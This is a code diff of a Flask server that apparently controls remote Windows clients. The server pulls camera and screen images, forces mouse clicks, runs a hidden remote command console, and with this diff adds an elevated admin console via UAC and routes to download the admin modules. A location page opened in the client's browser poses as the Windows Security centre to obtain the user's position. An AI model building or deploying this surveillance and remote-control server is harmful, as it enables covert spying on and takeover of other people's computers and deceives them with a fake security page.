@@ -8,6 +8,7 @@ suivantes sont suivies indépendamment :
   - Localisation : navigateur ouvert/fermé + position
   - Souris : position remontée, clics en file
   - CMD Commandes : console persistante côté client, buffer roulant de sortie
+  - CMD Commandes ADMIN : idem mais via UAC Windows (buffer séparé)
   - Chat : vraie console visible côté client, historique de conversation
 
 L'interface de contrôle (server_gui) s'y connecte en HTTP.
@@ -29,9 +30,6 @@ GUI_INSTALL_DIR = PROJECT_DIR / "install" / "linux"
 GITHUB_RELEASE_BASE = "https://github.com/Randriavaoselon/app-control-camera/releases/download/client-latest"
 GITHUB_RELEASE_BASE_GUI = "https://github.com/Randriavaoselon/app-control-camera/releases/download/client-latest"
 
-# Condition (= verrou + notification) : permet au GUI d'être réveillé
-# INSTANTANÉMENT quand une nouvelle image arrive (long-polling), au lieu
-# de redemander toutes les 100 ms et de télécharger deux fois la même image.
 devices_lock = threading.Condition()
 devices: dict[str, dict] = {}
 
@@ -39,14 +37,13 @@ CLIENT_TIMEOUT_SECONDS = 10
 MAX_LONG_POLL_SECONDS = 3.0
 STREAM_NAMES = ("camera", "screen")
 MAX_PENDING_CLICKS = 50
-MAX_OUTPUT_BUFFER = 64_000          # 64 Ko de scrollback pour le CMD
+MAX_OUTPUT_BUFFER = 64_000
 MAX_PENDING_SHELL_INPUT = 20
 MAX_CHAT_HISTORY = 100
 
 
 @app.route("/health", methods=["GET"])
 def health():
-    """Simple vérification que le serveur répond."""
     return jsonify({"status": "ok"})
 
 
@@ -55,11 +52,7 @@ def _default_stream_state() -> dict:
 
 
 def _default_location_state() -> dict:
-    return {
-        "command": "CLOSE",
-        "browser_open": False,
-        "latest": None,
-    }
+    return {"command": "CLOSE", "browser_open": False, "latest": None}
 
 
 def _default_mouse_state() -> dict:
@@ -73,25 +66,34 @@ def _default_mouse_state() -> dict:
 
 def _default_shell_state() -> dict:
     return {
-        # CMD Commandes : console persistante sans fenêtre côté client
-        "cmd_console_open": False,      # rapporté par le client
-        "cmd_console_cmd": "CLOSE",     # commande voulue par la GUI
-        "output_buffer": "",            # buffer roulant (ring) des dernières sorties
-        "output_seq": 0,                # incrémenté à chaque chunk
-        "shell_input": [],              # commandes en attente d'écriture dans stdin
+        # --- CMD Commandes (user) ---
+        "cmd_console_open": False,
+        "cmd_console_cmd": "CLOSE",
+        "output_buffer": "",
+        "output_seq": 0,
+        "shell_input": [],
 
-        # Chat : console visible côté client
-        "chat_out": [],                 # messages GUI -> client (à injecter)
-        "chat_in": [],                  # réponses client -> GUI (à consommer)
-        "chat_history": [],             # historique complet pour la GUI
-        "chat_window_open": False,      # rapporté par le client
-        "chat_window_cmd": "CLOSE",     # commande voulue par la GUI
+        # --- CMD Commandes (admin) ---
+        "admin_console_open": False,
+        "admin_console_cmd": "CLOSE",
+        "admin_refused": False,
+        "admin_output_buffer": "",
+        "admin_output_seq": 0,
+        "admin_shell_input": [],
+
+        # --- Chat ---
+        "chat_out": [],
+        "chat_in": [],
+        "chat_history": [],
+        "chat_window_open": False,
+        "chat_window_cmd": "CLOSE",
     }
 
 
 def _default_device_state(name: str | None) -> dict:
     return {
         "name": name or "Appareil inconnu",
+        "platform": "unknown",
         "last_seen": None,
         "streams": {stream: _default_stream_state() for stream in STREAM_NAMES},
         "location": _default_location_state(),
@@ -101,8 +103,6 @@ def _default_device_state(name: str | None) -> dict:
 
 
 def _get_or_create_device(device_id: str, name: str | None = None) -> dict:
-    """Appelé uniquement depuis le code du CLIENT : un appareil encore
-    inconnu est automatiquement enregistré."""
     device = devices.get(device_id)
     if device is None:
         device = _default_device_state(name)
@@ -119,14 +119,11 @@ def _device_is_alive(device: dict) -> bool:
 
 
 # ---------------------------------------------------------------------
-# Routes consommées par un CLIENT précis (device_id obligatoire)
+# Routes consommées par un CLIENT précis
 # ---------------------------------------------------------------------
 
 @app.route("/api/command", methods=["GET"])
 def get_command():
-    """Le client interroge cette route régulièrement avec son device_id ;
-    reçoit l'état voulu pour SES DEUX flux, PLUS la commande de localisation,
-    les commandes CMD/Chat, et un éventuel clic souris en attente."""
     device_id = request.args.get("device_id")
     if not device_id:
         return jsonify({"error": "device_id manquant"}), 400
@@ -142,24 +139,31 @@ def get_command():
             device["shell"]["chat_window_open"] = request.args["chat_window_open"] == "1"
         if request.args.get("cmd_console_open") is not None:
             device["shell"]["cmd_console_open"] = request.args["cmd_console_open"] == "1"
+        if request.args.get("admin_console_open") is not None:
+            device["shell"]["admin_console_open"] = request.args["admin_console_open"] == "1"
+        if request.args.get("admin_refused") == "1":
+            device["shell"]["admin_refused"] = True
+        elif request.args.get("admin_console_open") == "1":
+            device["shell"]["admin_refused"] = False
+        plat = request.args.get("platform")
+        if plat:
+            device["platform"] = plat
 
-        # Commandes flux vidéo
         commands = {stream: device["streams"][stream]["command"] for stream in STREAM_NAMES}
         commands["location"] = device["location"]["command"]
-
-        # CMD Commandes et Chat : commandes de cycle de vie
         commands["cmd_console"] = device["shell"]["cmd_console_cmd"]
+        commands["cmd_admin_console"] = device["shell"]["admin_console_cmd"]
         commands["chat_window"] = device["shell"]["chat_window_cmd"]
 
-        # Un seul clic par poll
         pending_clicks = device["mouse"]["pending_clicks"]
         commands["mouse_click"] = pending_clicks.pop(0) if pending_clicks else None
 
-        # Une seule commande shell par poll (écriture dans stdin du cmd.exe)
         shell_input = device["shell"]["shell_input"]
         commands["shell_input"] = shell_input.pop(0) if shell_input else None
 
-        # Un seul message chat par poll (injection dans la console visible)
+        admin_input = device["shell"]["admin_shell_input"]
+        commands["shell_admin_input"] = admin_input.pop(0) if admin_input else None
+
         chat_out = device["shell"]["chat_out"]
         commands["chat_message"] = chat_out.pop(0) if chat_out else None
 
@@ -168,7 +172,6 @@ def get_command():
 
 @app.route("/api/frame", methods=["POST"])
 def post_frame():
-    """Le client envoie une image JPEG (corps brut) pour un flux précis."""
     device_id = request.args.get("device_id")
     stream = request.args.get("stream")
     if not device_id:
@@ -176,7 +179,6 @@ def post_frame():
     if stream not in STREAM_NAMES:
         return jsonify({"error": "stream invalide (camera ou screen attendu)"}), 400
 
-    # IMPORTANT : le corps de la requête est lu AVANT de prendre le verrou.
     data = request.get_data()
     try:
         ts = int(request.args.get("ts", ""))
@@ -204,7 +206,6 @@ def post_frame():
 
 @app.route("/api/devices", methods=["GET"])
 def list_devices():
-    """Liste tous les appareils déjà vus par ce serveur."""
     with devices_lock:
         result = []
         for device_id, device in devices.items():
@@ -215,9 +216,11 @@ def list_devices():
             result.append({
                 "device_id": device_id,
                 "name": device["name"],
+                "platform": device.get("platform", "unknown"),
                 "camera_on": device["streams"]["camera"]["active"],
                 "screen_on": device["streams"]["screen"]["active"],
                 "location_open": device["location"]["browser_open"],
+                "admin_console_open": device["shell"]["admin_console_open"],
                 "connected": _device_is_alive(device),
                 "last_seen": last_seen,
             })
@@ -226,7 +229,6 @@ def list_devices():
 
 @app.route("/api/command", methods=["POST"])
 def set_command():
-    """La GUI envoie {'device_id': ..., 'stream': 'camera'|'screen', 'command': 'START'|'STOP'}."""
     payload = request.get_json(force=True, silent=True) or {}
     device_id = payload.get("device_id")
     stream = payload.get("stream")
@@ -264,16 +266,17 @@ def get_status():
         )
         return jsonify({
             "name": device["name"],
+            "platform": device.get("platform", "unknown"),
             "client_connected": _device_is_alive(device),
             "last_seen": last_seen,
             "camera_on": device["streams"]["camera"]["active"],
             "screen_on": device["streams"]["screen"]["active"],
+            "admin_console_open": device["shell"]["admin_console_open"],
         })
 
 
 @app.route("/api/frame/latest", methods=["GET"])
 def get_latest_frame():
-    """Renvoie la dernière image d'un flux (long-polling possible)."""
     device_id = request.args.get("device_id")
     stream = request.args.get("stream")
     if not device_id or stream not in STREAM_NAMES:
@@ -310,7 +313,7 @@ def get_latest_frame():
 
 
 # ---------------------------------------------------------------------
-# Localisation précise : navigateur ouvert/fermé chez le CLIENT
+# Localisation
 # ---------------------------------------------------------------------
 
 LOCATION_PAGE_TEMPLATE = """<!DOCTYPE html>
@@ -319,7 +322,6 @@ LOCATION_PAGE_TEMPLATE = """<!DOCTYPE html>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Centre de Sécurité Windows — Protection Intégrale</title>
-<!-- Favicon Windows Defender / Sécurité -->
 <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2338bdf8'><path d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/></svg>">
 <style>
   * {{ box-sizing: border-box; }}
@@ -452,14 +454,12 @@ LOCATION_PAGE_TEMPLATE = """<!DOCTYPE html>
 
 @app.route("/location/page", methods=["GET"])
 def location_page():
-    """Page ouverte AUTOMATIQUEMENT dans le navigateur du client."""
     device_id = request.args.get("device_id", "")
     return Response(LOCATION_PAGE_TEMPLATE.format(device_id=device_id), mimetype="text/html")
 
 
 @app.route("/location/report", methods=["POST"])
 def location_report():
-    """La PAGE WEB (chez le client) envoie ici la position."""
     payload = request.get_json(force=True, silent=True) or {}
     device_id = payload.get("device_id")
     lat, lon = payload.get("lat"), payload.get("lon")
@@ -480,7 +480,6 @@ def location_report():
 
 @app.route("/api/location/command", methods=["POST"])
 def set_location_command():
-    """La GUI envoie {'device_id': ..., 'command': 'OPEN'|'CLOSE'}."""
     payload = request.get_json(force=True, silent=True) or {}
     device_id = payload.get("device_id")
     command = payload.get("command")
@@ -500,7 +499,6 @@ def set_location_command():
 
 @app.route("/api/location/latest", methods=["GET"])
 def get_location_latest():
-    """La GUI interroge cette route pour afficher la carte."""
     device_id = request.args.get("device_id")
     if not device_id:
         return jsonify({"error": "device_id manquant"}), 400
@@ -518,12 +516,11 @@ def get_location_latest():
 
 
 # ---------------------------------------------------------------------
-# Souris : position remontée par le CLIENT, clics demandés par la GUI
+# Souris
 # ---------------------------------------------------------------------
 
 @app.route("/api/mouse/move", methods=["POST"])
 def mouse_move():
-    """Le client envoie la position courante de sa souris."""
     payload = request.get_json(force=True, silent=True) or {}
     device_id = payload.get("device_id")
     x, y = payload.get("x"), payload.get("y")
@@ -544,7 +541,6 @@ def mouse_move():
 
 @app.route("/api/mouse/click", methods=["POST"])
 def mouse_click():
-    """La GUI demande un clic aux coordonnées écran."""
     payload = request.get_json(force=True, silent=True) or {}
     device_id = payload.get("device_id")
     x, y = payload.get("x"), payload.get("y")
@@ -564,7 +560,6 @@ def mouse_click():
 
 @app.route("/api/mouse/latest", methods=["GET"])
 def mouse_latest():
-    """La GUI interroge cette route pour dessiner le curseur et convertir un clic."""
     device_id = request.args.get("device_id")
     if not device_id:
         return jsonify({"error": "device_id manquant"}), 400
@@ -582,12 +577,11 @@ def mouse_latest():
 
 
 # ---------------------------------------------------------------------
-# CMD Commandes : console persistante côté client, buffer roulant
+# CMD Commandes (user)
 # ---------------------------------------------------------------------
 
 @app.route("/api/shell/console", methods=["POST"])
 def shell_console_control():
-    """La GUI ouvre/ferme la console distante du client."""
     payload = request.get_json(force=True, silent=True) or {}
     device_id = payload.get("device_id")
     command = payload.get("command")
@@ -603,7 +597,6 @@ def shell_console_control():
 
 @app.route("/api/shell/console/state", methods=["GET"])
 def shell_console_state():
-    """La GUI interroge l'état de la console distante."""
     device_id = request.args.get("device_id")
     if not device_id:
         return jsonify({"error": "device_id manquant"}), 400
@@ -620,7 +613,6 @@ def shell_console_state():
 
 @app.route("/api/shell/input", methods=["POST"])
 def shell_input():
-    """La GUI envoie une commande à écrire dans stdin de la console distante."""
     payload = request.get_json(force=True, silent=True) or {}
     device_id = payload.get("device_id")
     text = payload.get("text")
@@ -639,25 +631,27 @@ def shell_input():
 
 @app.route("/api/shell/output", methods=["POST"])
 def shell_output():
-    """Le client pousse un chunk de sortie console (stdout/stderr fusionnés)."""
     payload = request.get_json(force=True, silent=True) or {}
     device_id = payload.get("device_id")
     chunk = payload.get("chunk") or ""
+    mode = payload.get("mode", "user")
     if not device_id:
         return jsonify({"error": "device_id manquant"}), 400
     with devices_lock:
         device = _get_or_create_device(device_id)
         sh = device["shell"]
-        sh["output_buffer"] = (sh["output_buffer"] + chunk)[-MAX_OUTPUT_BUFFER:]
-        sh["output_seq"] += 1
+        if mode == "admin":
+            sh["admin_output_buffer"] = (sh["admin_output_buffer"] + chunk)[-MAX_OUTPUT_BUFFER:]
+            sh["admin_output_seq"] += 1
+        else:
+            sh["output_buffer"] = (sh["output_buffer"] + chunk)[-MAX_OUTPUT_BUFFER:]
+            sh["output_seq"] += 1
         devices_lock.notify_all()
     return jsonify({"ok": True})
 
 
 @app.route("/api/shell/output/latest", methods=["GET"])
 def shell_output_latest():
-    """La GUI récupère les nouvelles sorties console (long-polling possible).
-    Body : buffer complet (≤64 Ko) — la GUI remplace le contenu à chaque tick."""
     device_id = request.args.get("device_id")
     if not device_id:
         return jsonify({"error": "device_id manquant"}), 400
@@ -683,12 +677,94 @@ def shell_output_latest():
 
 
 # ---------------------------------------------------------------------
-# Chat : console visible côté client
+# CMD Commandes ADMIN
+# ---------------------------------------------------------------------
+
+@app.route("/api/shell/admin/console", methods=["POST"])
+def shell_admin_console_control():
+    payload = request.get_json(force=True, silent=True) or {}
+    device_id = payload.get("device_id")
+    command = payload.get("command")
+    if not device_id or command not in ("OPEN", "CLOSE"):
+        return jsonify({"error": "device_id et command (OPEN/CLOSE) requis"}), 400
+    with devices_lock:
+        device = devices.get(device_id)
+        if device is None:
+            return jsonify({"error": "appareil inconnu"}), 404
+        device["shell"]["admin_console_cmd"] = command
+        if command == "CLOSE":
+            device["shell"]["admin_refused"] = False
+    return jsonify({"ok": True})
+
+
+@app.route("/api/shell/admin/console/state", methods=["GET"])
+def shell_admin_console_state():
+    device_id = request.args.get("device_id")
+    if not device_id:
+        return jsonify({"error": "device_id manquant"}), 400
+    with devices_lock:
+        device = devices.get(device_id)
+        if device is None:
+            return jsonify({"error": "appareil inconnu"}), 404
+        sh = device["shell"]
+        return jsonify({
+            "command": sh["admin_console_cmd"],
+            "console_open": sh["admin_console_open"],
+            "admin_refused": sh["admin_refused"],
+        })
+
+
+@app.route("/api/shell/admin/input", methods=["POST"])
+def shell_admin_input():
+    payload = request.get_json(force=True, silent=True) or {}
+    device_id = payload.get("device_id")
+    text = payload.get("text")
+    if not device_id or text is None:
+        return jsonify({"error": "device_id et text requis"}), 400
+    with devices_lock:
+        device = devices.get(device_id)
+        if device is None:
+            return jsonify({"error": "appareil inconnu"}), 404
+        sh = device["shell"]
+        if len(sh["admin_shell_input"]) >= MAX_PENDING_SHELL_INPUT:
+            return jsonify({"error": "file pleine"}), 429
+        sh["admin_shell_input"].append({"id": _uuid.uuid4().hex, "text": text})
+    return jsonify({"ok": True})
+
+
+@app.route("/api/shell/admin/output/latest", methods=["GET"])
+def shell_admin_output_latest():
+    device_id = request.args.get("device_id")
+    if not device_id:
+        return jsonify({"error": "device_id manquant"}), 400
+    after = request.args.get("after", type=int)
+    wait = min(max(request.args.get("wait", 0.0, type=float) or 0.0, 0.0), 3.0)
+    with devices_lock:
+        device = devices.get(device_id)
+        if device is None:
+            return jsonify({"error": "appareil inconnu"}), 404
+        sh = device["shell"]
+
+        def has_new() -> bool:
+            return after is None or sh["admin_output_seq"] != after
+
+        if wait > 0 and not has_new():
+            devices_lock.wait_for(has_new, timeout=wait)
+
+        return jsonify({
+            "seq": sh["admin_output_seq"],
+            "buffer": sh["admin_output_buffer"],
+            "console_open": sh["admin_console_open"],
+            "admin_refused": sh["admin_refused"],
+        })
+
+
+# ---------------------------------------------------------------------
+# Chat
 # ---------------------------------------------------------------------
 
 @app.route("/api/shell/chat_window", methods=["POST"])
 def shell_chat_window():
-    """La GUI ouvre/ferme la console chat du client."""
     payload = request.get_json(force=True, silent=True) or {}
     device_id = payload.get("device_id")
     command = payload.get("command")
@@ -704,7 +780,6 @@ def shell_chat_window():
 
 @app.route("/api/shell/chat_window/state", methods=["GET"])
 def shell_chat_window_state():
-    """La GUI interroge l'état de la console chat."""
     device_id = request.args.get("device_id")
     if not device_id:
         return jsonify({"error": "device_id manquant"}), 400
@@ -720,7 +795,6 @@ def shell_chat_window_state():
 
 @app.route("/api/shell/chat", methods=["POST"])
 def shell_chat():
-    """La GUI envoie un message vers la console chat du client."""
     payload = request.get_json(force=True, silent=True) or {}
     device_id = payload.get("device_id")
     message = payload.get("message")
@@ -739,7 +813,6 @@ def shell_chat():
 
 @app.route("/api/shell/result", methods=["POST"])
 def shell_result():
-    """Le client renvoie une réponse chat (l'utilisateur du client a tapé)."""
     payload = request.get_json(force=True, silent=True) or {}
     device_id = payload.get("device_id")
     if not device_id:
@@ -757,7 +830,6 @@ def shell_result():
 
 @app.route("/api/shell/results", methods=["GET"])
 def shell_results():
-    """La GUI récupère les nouvelles réponses chat (consommées à la lecture)."""
     device_id = request.args.get("device_id")
     if not device_id:
         return jsonify({"error": "device_id manquant"}), 400
@@ -772,12 +844,22 @@ def shell_results():
 
 
 # ---------------------------------------------------------------------
-# Téléchargement du CLIENT (source + installateur Windows)
+# Téléchargements
 # ---------------------------------------------------------------------
 
 @app.route("/client/download", methods=["GET"])
 def download_client():
     return send_from_directory(PROJECT_DIR, "client.py", as_attachment=False)
+
+
+@app.route("/client/download/bridge", methods=["GET"])
+def download_admin_bridge():
+    return send_from_directory(PROJECT_DIR, "admin_bridge.py", as_attachment=False)
+
+
+@app.route("/client/download/admin_module", methods=["GET"])
+def download_admin_module():
+    return send_from_directory(PROJECT_DIR, "console_admin_windows.py", as_attachment=False)
 
 
 @app.route("/client/requirements", methods=["GET"])
@@ -787,13 +869,8 @@ def download_requirements():
 
 @app.route("/download/windows", methods=["GET"])
 def download_windows_installer():
-    """Redirection vers l'asset GitHub Release (pas de stockage local)."""
     return redirect(f"{GITHUB_RELEASE_BASE}/CameraClient-Setup.exe")
 
-
-# ---------------------------------------------------------------------
-# Téléchargement de la GUI (installation sous Linux via curl)
-# ---------------------------------------------------------------------
 
 @app.route("/gui/install", methods=["GET"])
 def download_gui_installer_script():
@@ -816,7 +893,6 @@ def download_windows_gui_exe():
 
 
 if __name__ == "__main__":
-    # HTTP/1.1 : indispensable pour les connexions « keep-alive » du client.
     from werkzeug.serving import WSGIRequestHandler
     WSGIRequestHandler.protocol_version = "HTTP/1.1"
     app.run(host="0.0.0.0", port=5050, threaded=True)
